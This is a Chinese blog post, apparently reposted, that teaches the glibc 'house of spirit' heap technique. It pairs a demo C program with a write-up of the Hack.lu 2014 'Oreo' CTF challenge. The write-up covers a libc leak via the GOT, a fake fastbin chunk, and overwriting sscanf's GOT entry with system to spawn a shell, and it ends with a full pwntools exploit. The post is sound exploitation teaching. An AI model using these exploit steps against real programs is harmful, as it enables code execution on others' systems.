> 原文链接: https://www.anquanke.com//post/id/244158 


# 堆利用系列之house of spirit


                                阅读量   
                                **236454**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01cca9ce390216e96f.png)](https://p4.ssl.qhimg.com/t01cca9ce390216e96f.png)



## 前言

house of spirit攻击是一种构造虚假的chunk(通常是fast chunk)，free这个chunk把它放到fastbin上，然后通过再次申请得到对这个chunk的控制权。构造虚假chunk的时候需要注意两个size，一个是这个虚假chunk的size还有一个是紧邻chunk的size。在特殊的场景下可以进行应用。



## house of spirit例程

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(void)
`{`
    puts("So we will be covering a House of Spirit Attack.");
    puts("A House of Spirit Attack allows us to get malloc to return a fake chunk to a region we have some control over (such as the bss or stack).");
    puts("In order for this attack to work and pass all of the malloc checks, we will need to make two fake chunks.");
    puts("To setup the fake chunks, we will need to write fake size values for the chunks.");
    puts("Also the first fake chunk is where we will want our chunk returned by malloc to be.");
    puts("Let's get started!\n");


    unsigned long array[20];
    printf("So we start off by initializing our array on the stack.\n");
    printf("Array Start: %p\n", array);
    printf("Our goal will be to allocate a chunk at %p\n\n", &amp;array[2]);


    printf("Now we need to write our two size values for the chunks.\n");
    printf("There are three restrictions we have to meet.\n\n");

    printf("0.) Size of the chunks must be within the fast bin range.\n");
    printf("1.) The size values must be placed where they should if they were an actual chunk.\n");
    printf("2.) The size of the first heap chunk (the one that gets freed and reallocated) must be the same as the rounded up heap size of the malloc that we want to allocate our fake chunk.\n");
    printf("That should be larger than the argument passed to malloc.\n\n");

    printf("Also as a side note, the two sizes don't have to be equal.\n");
    printf("Check the code comments for how the fake heap chunks are structured.\n");
    printf("With that, let's write our two size values.\n\n");

    /*
    this will be the structure of our two fake chunks:
    assuming that you compiled it for x64

    +-------+---------------------+------+
    | 0x00: | Chunk # 0 prev size | 0x00 |
    +-------+---------------------+------+
    | 0x08: | Chunk # 0 size      | 0x60 |
    +-------+---------------------+------+
    | 0x10: | Chunk # 0 content   | 0x00 |
    +-------+---------------------+------+
    | 0x60: | Chunk # 1 prev size | 0x00 |
    +-------+---------------------+------+
    | 0x68: | Chunk # 1 size      | 0x40 |
    +-------+---------------------+------+
    | 0x70: | Chunk # 1 content   | 0x00 |
    +-------+---------------------+------+

    for what we are doing the prev size values don't matter too much
    the important thing is the size values of the heap headers for our fake chunks
    */

    array[1] = 0x60;
    array[13] = 0x40;

    printf("Now that we setup our fake chunks set up, we will now get a pointer to our first fake chunk.\n");
    printf("This will be the ptr that we get malloc to return for this attack\n");

    unsigned long *ptr;
    ptr = &amp;(array[2]);

    printf("Address: %p\n\n", ptr);

    printf("Now we will free the pointer to place it into the fast bin.\n");

    free(ptr);

    printf("Now we can just allocate a chunk that it's rounded up malloc size will be equal to that of our fake chunk (0x60), and we should get malloc to return a pointer to array[1].\n\n");

    unsigned long *target;
    target = malloc(0x50);

    printf("returned pointer: %p\n", target);

`}`
```



## Hack.lu 2014 Oreo

[文件链接](https://github.com/guyinatuxedo/nightmare/tree/master/modules/39-house_of_spirit/hacklu14_oreo)

### <a class="reference-link" name="%E6%9E%84%E5%BB%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83"></a>构建调试环境

首先看一下二进制和libc的情况.

```
file ./oreo
ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.26, BuildID[sha1]=f591eececd05c63140b9d658578aea6c24450f8b, stripped
```

可以发现这是一个32位的x86的二进制，而且这是一个可执行文件，就是加载地址是在固定的位置0x08048000。

链接给了一个libc.2.23的文件，但是我无法直接用pwntools中的process运行，均提示segment fault，尝试了几种方法最终通过运行ld文件，把二进制作为参数传给ld，然后指定LD_PRELOAD为libc.2.23的方法构建了调试环境。本文的调试主机环境为ubuntu18.04

```
from pwn import *
target = process(argv=['./ld-2.23.so','./oreo'], env=`{`"LD_PRELOAD":"./libc.so.6"`}`)
```

ld-2.23.so和libc.so.6是从glibc-all-in-one中下载的2.23版本的glibc文件，具体方法可参考我的前文。<br>
至于为什么不能通过直接运行oreo二进制进行调试，我不太清楚原因，貌似是当oreo是可执行文件的时候，ld文件运行的时候有些问题，想通过调试确定一下问题，但是ld的逻辑太复杂，所以作罢，有更优雅的解决方案同学可以提示一下。

### <a class="reference-link" name="%E9%80%86%E5%90%91%E5%AE%A1%E8%AE%A1"></a>逆向审计

通过逆向观察oreo二进制反编译代码，二进制有几个功能

```
case 1:
        add_rifle();
        break;
      case 2:
        show_added_rifles();
        break;
      case 3:
        order_selected_rifles();
        break;
      case 4:
        leave_message_with_order();
        break;
      case 5:
        show_current_stats();
        break;
      case 6:
        return __readgsdword(0x14u) ^ v1;
      default:
        continue;
    `}`
```

add_rifle就是相当于malloc创建一个chunk，show_added_rifles就是打印内存内容，而order_selected_rifles这个函数的功能是对所有创建的chunk进行free，还有一个函数是读取数据到一个bss段的全局变量<br>
漏洞点也比较明显，在add_rifle中

```
mem_store_rifles = (char *)malloc(0x38u);  //创建0x38 + 8的chunk
  if ( mem_store_rifles )
  `{`
    *((_DWORD *)mem_store_rifles + 13) = v1;     // 把上一个chunk写入到新chunk中
    printf("Rifle name: ");
    fgets(mem_store_rifles + 25, 56, stdin);   //写入的时候是从偏移25的地方再写入56个字节，堆溢出
    sub_80485EC(mem_store_rifles + 25);
    printf("Rifle description: ");
    fgets(mem_store_rifles, 56, stdin);
    sub_80485EC(mem_store_rifles);
    ++new_rifle_num;
```

创建的chunk大小是0x40，但是写入的时候是从偏移25的位置再写入56个字节，这会造成堆溢出。<br>
在这个函数中还有一个把旧的chunk指针写入到当前这个chunk中保存的逻辑，这个逻辑比较特殊应该会在后面的利用中用到。

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"></a>利用思路

我本人尝试了几种思路一开始，但是都遇到了一些问题，首先这个创建chunk的大小都是固定的不是可控的，而且释放的时候也是根据链表进行全部释放，所以也不能随意的指定释放的顺序。这就给利用带来了一些困难。

#### <a class="reference-link" name="%E5%B0%9D%E8%AF%95fastbin%E6%94%BB%E5%87%BB"></a>尝试fastbin攻击

通过溢出我们是可以通过fastbin 攻击把fastbin中的chunk的fd指针给修改到我们想要的地方，但是由于再次malloc的时候会验证chunk的size是否符合对应的fastbin size，我并没有在二进制中看到可以满足这个size的内存，所以这种方式比较难实现fastbin攻击，而且由于最终要借用system这种函数去实现拿shell，由于system函数没有在二进制中调用，所以最终还是要知道libc的加载地址才行。

#### <a class="reference-link" name="%E5%B0%9D%E8%AF%95%E6%B3%84%E9%9C%B2libc%E5%9C%B0%E5%9D%80"></a>尝试泄露libc地址

泄露libc地址的方式可以通过打印got表或者打印unsorted bin中的chunk的fd指针来实现，第一种打印got表需要劫持函数并且要求函数的参数是用户可控的，由于我们并不能实现对任意地址的写入功能，实现劫持函数就比较难实现，所以这种方法实现libc地址的难度较大。<br>
尝试通过unsroted bin实现libc泄露也很困难，因为这个大小是0x40的chunk固定分配的，而0x40还是在fastbin的大小范围内，所以要想得到一个unsorted bin上的chunk就不容易，我想的是通过修改储存在当前chunk中的旧chunk的指针，让这个旧chunj指针指向一个虚假的地址，而且让-4偏移的内存作为假的size字段，但是我还是搜遍了二进制没有发现到很合适的size，能够不触发合并，而且没有让mmap标志位置1的内存，所以这种方式我也失败了。<br>
数据结构图

[![](https://p3.ssl.qhimg.com/t01e3c4e8e8c1435c41.png)](https://p3.ssl.qhimg.com/t01e3c4e8e8c1435c41.png)

#### <a class="reference-link" name="%E7%BB%93%E5%90%88%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%9C%AC%E8%BA%AB%E7%9A%84%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91"></a>结合二进制本身的业务逻辑

泄露libc地址的通用方法在这个二进制中非常困难，所以我们不得不考虑结合二进制本身的业务逻辑去做这个libc的地址泄露。这个二进制比较特殊的一个点是它把新旧chunk用链表的形式给串起来了，所以我们要充分利用这链表指针，因为这个指针我们是可以控制的，所以我们直接可以让这个链表指针指向我们的GOT表，通过打印逻辑把GOT表中的内容给打印出来。

我们可以让这个链表指针指向puts的got表地址0x0804A248，我们只需要控制分配的内容，覆盖这个指针。我们通过逆向add_rifle的逻辑可以发现，name这个字段是从偏移25的地方开始写入，然后可以写入56个字节，而我们的链表指针的偏移是52,所以我们的name可以写入27个字节之后，再写入的内容就是指针内容。

拿到了libc的地址后，我们就可以通过fastbin attack去修改malloc_hook和free_hook的值，但是同样的由于这两个地址附近都是没有可用的size的，got表附近也是没有可用的size，所以这题貌似通过简单的fastbin attack是行不通的，只能思考别的办法。

我们目标是修改GOT表，或者是函数指针的的值，但是目前我们没有这个条件，现在又卡到了我们，只能再去研究二进制，我们可以注意到还有一个leave message的函数我们是没有用到的，而这个函数是往一个指针指向的内存中写入数据，这个数据是我们可控的。而且发现存储这个指针的内存前面4个字节的内存内容也是可控的，他是表示创建的rifle的数目。所以思路出来了，如果我们能够修改这个指针，让他指向got表，就可以往got表中写入值了。

我们可以利用house of spirit实现修改这个指针。首先让这个rifle数目满足我们的0x40，然后free这个存储指针的地址，这样我们就在fastbin中添加了这个chunk，然后再malloc就可以得到对这个存储指针的地址的控制权，然后我们修改这个指针让他指向got表。

hof还有一个前置条件就是要修下一个紧邻chunk的size值，让他大于 `2 * SIZE_SZ`，否则会不满足glibc的校验条件。我们可控紧邻chunk的size在什么位置。假chunk的地址是`0x804A2A0`，大小是0x40，那么紧邻chunk的地址就是`0x0804A2A0 + 0x40 = 0x804a2e0`, 利用leave message这个函数是可以修改`0x0804A2C0 ~ 0x804A2C0 + 0x80`这块的地址的，下一个紧邻chunk的size字段相对于0x0804A2C0的偏移是`0x804a2e0 + 4 - 0x0804A2C0 = 0x24`, 因此我们通过写入0x24个字节的占位字节，然后和一个满足大于 2 * SIZE_SZ的假size字段就可以满足hos的条件。占位字节最好是NULL，只有这样才能在free链表指针的时候停下来。

经过这些操作我们可以得到一个虚假的0x40大小的fastbin chunk

```
Fastbins[idx=6, size=0x40]  ←  Chunk(addr=0x804a2a8, size=0x40, flags=PREV_INUSE)  ←  Chunk(addr=0x58252418, size=0x40, flags=PREV_INUSE)
```

并且这个chunk的地址也是我们想要的0x804a2a8。

我们再通过申请一个0x40的chunk拿到对0x804a2a8的控制权，我们就可以把一个函数的got表地址写入到0x804a2a8中，我们应该选择哪一个函数呢，我们目标是把这个got表写入system函数，system函数的第一个参数需要是我们可以控制的，所以被复写的函数最好也是一个第一个参数是用户可控的函数，所有的GOT函数列表

```
printf
free
fgets
__stack_chk_fail
malloc
puts
strlen
__libc_start_main
__isoc99_sscanf    
__gmon_start__.
```

找来找去只有__isoc99_sscanf符合这个条件

```
int sub_8048896()
`{`
  int v1; // [esp+18h] [ebp-30h] BYREF
  char s[32]; // [esp+1Ch] [ebp-2Ch] BYREF
  unsigned int v3; // [esp+3Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  do
  `{`
    printf("Action: ");
    fgets(s, 32, stdin);
  `}`
  while ( !(__isoc99_sscanf)(s, "%u", &amp;v1) );   //第一个参数是从fgets中读出来的可控的
  return v1;
`}`
```

所以我们通过申请一个0x40的chunk，然后给这个chunk赋值为sscanf的got表地址，这样就把`0x804a2a`8指向了`scanf.got`的地址，如果我们再次调用`leavemessage`函数就可以让这个got表的值修改为system在 libc中的偏移地址了。之后在通过发送/bin/sh字符串，调用sscanf进而调用system得到shell。

### <a class="reference-link" name="%E6%88%91%E7%9A%84exp"></a>我的exp

```
from pwn import *

target = process(argv=['./ld-2.23.so','./oreo_origin'], env=`{`"LD_PRELOAD":"./libc.so.6"`}`)
# gdb.attach(target)
elf = ELF('oreo_origin')
libc = ELF("libc.so.6")

def addRifle(name, desc):
  target.sendline('1')
  target.sendline(name)
  target.sendline(desc)

def leakLibc():
  target.sendline('2')
  print target.recvuntil("Description: ")
  print target.recvuntil("Description: ")
  leak = target.recvline()
  puts_addr = u32(leak[0:4])
  libc_base = puts_addr - libc.symbols['puts']
  return libc_base

def orderRifles():
  target.sendline("3")

def leaveMessage(content):
  target.sendline("4")
  target.sendline(content)

addRifle('1'*27 + p32(0x804A248) ,'123')
libc_addr = leakLibc()
print(hex(libc_addr))

for i in range(0,0x40-1):
    addRifle('123','123')


target.sendline('5')
res = target.recv()
res = target.recv()

addRifle('A'*27 + p32(0x804A2A8),'123')

leaveMessage('\x00' * 0x24 + p32(0x20))

orderRifles()

addRifle('123', p32(elf.got['__isoc99_sscanf']))
addRifle('A'*31 + p32(0x40) + p32(0x61),'123')
system = libc_addr + libc.symbols['system']
leaveMessage(p32(system))
target.sendline('/bin/sh')
target.interactive()
```



## 结语

hos攻击的应用场景是比较苛刻的，需要能够有一个逻辑能触发错误的free, 目标地址的前面和后面都要是可控的才能满足两个size的检测。在实际的漏洞挖掘利用中，笔者感觉很难见到。



## 参考

1.[https://guyinatuxedo.github.io/39-house_of_spirit/house_spirit_exp/index.html](https://guyinatuxedo.github.io/39-house_of_spirit/house_spirit_exp/index.html)<br>
2.[https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit](https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit)<br>
3.[https://github.com/guyinatuxedo/nightmare/tree/master/modules/39-house_of_spirit/hacklu14_oreo](https://github.com/guyinatuxedo/nightmare/tree/master/modules/39-house_of_spirit/hacklu14_oreo)
